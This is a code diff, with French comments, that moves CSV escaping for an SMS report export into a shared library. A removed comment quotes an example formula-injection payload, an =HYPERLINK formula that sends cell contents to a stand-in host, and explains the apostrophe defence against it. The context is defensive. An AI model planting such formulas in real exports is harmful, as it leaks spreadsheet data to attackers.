@@ -6,6 +6,7 @@ import { debutDeFenetre } from "@noyau/analyse";
 import { FUSEAU } from "@/lib/fuseau";
 import type { Langue } from "@noyau/langue";
 import { porteeDe, porteeDuLienDeBilan } from "@/lib/portee";
+import { fichierCsv } from "@/lib/csv";
 
 export const dynamic = "force-dynamic";
 
@@ -32,20 +33,7 @@ const LIGNES_MAX = 20_000;
 // on prend large en amont, puis on coupe exactement sur l'heure qui fait foi.
 const MARGE_RELEVE_MS = 7 * 86_400_000;
 
-// Un champ CSV. Deux protections :
-//   1. le texte d'un SMS peut tout contenir — on l'entoure de guillemets dès
-//      qu'il porte le séparateur, un guillemet ou un saut de ligne ;
-//   2. surtout, un tableur voit une cellule qui commence par « = + - @ »
-//      (ou une tabulation) comme une FORMULE. Un SMS piégé
-//      « =HYPERLINK("http://vol.example"&A1,"clic") » s'exécuterait alors à
-//      l'ouverture du bilan dans Excel, dans le compte du propriétaire.
-//      On désamorce en préfixant ces cellules d'une apostrophe : le tableur
-//      l'affiche comme du texte, la valeur reste lisible.
-function champ(v: string | number | null): string {
-  let s = v == null ? "" : String(v);
-  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
-  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
-}
+// Un champ CSV : voir lib/csv.ts (les guillemets, et la formule désamorcée).
 
 // La colonne « carte » porte l'ICCID, comme l'export du robot : c'est le
 // seul nom d'une puce qui ne change jamais — le libellé « MTN ·8901 » est
@@ -137,8 +125,8 @@ export async function GET(req: Request) {
         + "cette période ; seuls les plus récents figurent ci-dessous."]);
   }
 
-  // Le BOM en tête : sans lui, Excel ouvre l'UTF-8 en dépit du bon sens.
-  const csv = "\uFEFF" + rangs.map((r) => r.map(champ).join(";")).join("\r\n") + "\r\n";
+  // Le BOM en tête, comme le relevé (lib/csv.ts).
+  const csv = fichierCsv(rangs);
 
   const nom = `bilan-totem-${jourLocal(new Date(), FUSEAU)}.csv`;
   return new Response(csv, {
